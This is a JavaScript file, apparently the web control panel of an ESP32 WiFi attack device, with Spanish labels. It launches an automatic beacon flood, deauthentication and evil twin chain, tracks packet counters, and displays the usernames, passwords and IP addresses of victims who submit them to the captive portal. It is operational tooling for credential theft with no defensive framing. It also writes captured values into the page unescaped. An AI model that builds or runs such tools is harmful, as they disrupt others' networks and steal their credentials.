let _attackPollInterval = null;
let _renderedCredKeys = new Set();
let _lastNewCredTs = null;
let _newBadgeTimer = null;
let _lastCredCount = 0;

const PHASE_LABELS = {
  IDLE: 'EN ESPERA',
  FASE_1: 'FASE 1 — BEACON FLOOD',
  FASE_2: 'FASE 2 — DEAUTH',
  FASE_3: 'FASE 3 — EVIL TWIN',
  FINALIZADO: 'FINALIZADO',
};

function renderAttack() {
  _renderedCredKeys = new Set();
  _lastCredCount = 0;
  if (_newBadgeTimer) { clearTimeout(_newBadgeTimer); _newBadgeTimer = null; }
  const el = document.getElementById('view-attack');
  el.innerHTML = `
    <div class="max-w-2xl">
      <div class="flex items-center justify-between mb-6">
        <div>
          <h2 class="text-xl font-bold">Ataque en Progreso</h2>
          <p class="text-xs text-gray-400 mt-1">Cadena automatica: Beacon Flood &rarr; Deauth &rarr; Evil Twin</p>
        </div>
        <button onclick="stopAttack()"
          class="px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg font-bold">
          DETENER
        </button>
      </div>
      <div id="attack-error" class="hidden mb-4 bg-red-900 border border-red-600 rounded p-3 text-sm text-red-300"></div>
      <div class="bg-gray-800 rounded-xl p-6 mb-6">
        <div class="text-3xl font-bold text-center mb-2" id="attack-phase">INICIANDO...</div>
        <div class="text-sm text-center text-gray-400" id="attack-timer">00:00</div>
      </div>
      <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
        <div class="bg-gray-800 rounded-lg p-3 text-center">
          <div id="cnt-beacons" class="text-2xl font-bold text-yellow-400">0</div>
          <div class="text-xs text-gray-400">Beacons</div>
        </div>
        <div class="bg-gray-800 rounded-lg p-3 text-center">
          <div id="cnt-deauths" class="text-2xl font-bold text-orange-400">0</div>
          <div class="text-xs text-gray-400">Deauths</div>
        </div>
        <div class="bg-gray-800 rounded-lg p-3 text-center">
          <div id="cnt-clients" class="text-2xl font-bold text-blue-400">0</div>
          <div class="text-xs text-gray-400">Clientes ET</div>
        </div>
        <div class="bg-gray-800 rounded-lg p-3 text-center">
          <div id="cnt-creds" class="text-2xl font-bold text-green-400">0</div>
          <div class="text-xs text-gray-400">Credenciales</div>
        </div>
      </div>
      <div class="bg-gray-800 rounded-xl p-4">
        <h3 class="font-semibold mb-3">Credenciales Capturadas <span id="cred-badge" class="hidden ml-2 text-xs bg-green-600 text-white px-2 py-0.5 rounded-full">NUEVO</span></h3>
        <p class="text-xs text-gray-500 mb-3">Capturadas cuando una victima se conecta al Evil Twin y envia su contrasena al portal cautivo.</p>
        <ul id="cred-list" class="space-y-2 text-sm font-mono"></ul>
        <p id="no-creds" class="text-gray-500 text-sm">Sin credenciales aun.</p>
      </div>
    </div>`;

  startOrResumeAttack();
}

async function startOrResumeAttack() {
  // Check if attack is already running before trying to start
  try {
    const status = await api.attackStatus();
    if (status.ataque_activo) {
      // Already running — just poll
    } else {
      const r = await api.attackStart({ modo: 'cadena_automatica' });
      if (r.ok === false) {
        const errEl = document.getElementById('attack-error');
        if (errEl) {
          errEl.textContent = 'Error al iniciar: ' + (r.error || r.codigo);
          errEl.classList.remove('hidden');
        }
        return;
      }
    }
  } catch(e) {
    const errEl = document.getElementById('attack-error');
    if (errEl) {
      errEl.textContent = 'No se pudo contactar el ESP32.';
      errEl.classList.remove('hidden');
    }
    return;
  }

  if (_attackPollInterval) clearInterval(_attackPollInterval);
  _attackPollInterval = setInterval(pollAttackStatus, 1000);
}

async function pollAttackStatus() {
  try {
    // /attack/status has phase + timer; /status has counters
    const [atk, full] = await Promise.all([api.attackStatus(), api.status()]);
    const fase = atk.estado_cadena || 'IDLE';
    document.getElementById('attack-phase').textContent = PHASE_LABELS[fase] || fase;
    const elapsed = atk.tiempo_transcurrido_seg || 0;
    const mm = String(Math.floor(elapsed / 60)).padStart(2, '0');
    const ss = String(elapsed % 60).padStart(2, '0');
    document.getElementById('attack-timer').textContent = `${mm}:${ss}`;

    const cnt = full.contadores || {};
    document.getElementById('cnt-beacons').textContent = cnt.beacons_emitidos || 0;
    document.getElementById('cnt-deauths').textContent = cnt.deauths_emitidos || 0;
    document.getElementById('cnt-clients').textContent = cnt.clientes_evil_twin || 0;
    const credCount = cnt.credenciales_capturadas || 0;
    document.getElementById('cnt-creds').textContent = credCount;

    if (credCount > 0 && credCount > _lastCredCount) {
      _lastCredCount = credCount;
      const cdata = await api.credentials();
      renderCredentials(cdata.credenciales || []);
    }

    if (fase === 'FINALIZADO') {
      clearInterval(_attackPollInterval);
      _attackPollInterval = null;
      setTimeout(() => showView('summary'), 1500);
    }
  } catch(e) {}
}

function renderCredentials(creds) {
  const list = document.getElementById('cred-list');
  const none = document.getElementById('no-creds');
  const badge = document.getElementById('cred-badge');
  if (!creds.length) return;
  if (none) none.style.display = 'none';

  let addedAny = false;
  creds.forEach(c => {
    const key = `${c.timestamp_ms}:${c.usuario}`;
    if (_renderedCredKeys.has(key)) return;
    _renderedCredKeys.add(key);
    addedAny = true;
    const li = document.createElement('li');
    li.className = 'bg-gray-700 rounded p-2';
    li.innerHTML = `<span class="text-green-400">${c.usuario}</span> / <span class="text-yellow-300">${c.password}</span>
      <span class="text-gray-400 text-xs ml-2">${c.cliente_ip} &bull; ${new Date(c.timestamp_ms).toLocaleTimeString()}</span>`;
    list.appendChild(li);
  });

  if (addedAny) {
    if (badge) badge.classList.remove('hidden');
    _lastNewCredTs = Date.now();
    if (_newBadgeTimer) clearTimeout(_newBadgeTimer);
    _newBadgeTimer = setTimeout(() => {
      if (badge) badge.classList.add('hidden');
    }, 5000);
  }
}

async function stopAttack() {
  clearInterval(_attackPollInterval);
  _attackPollInterval = null;
  await api.attackStop();
  showView('summary');
}
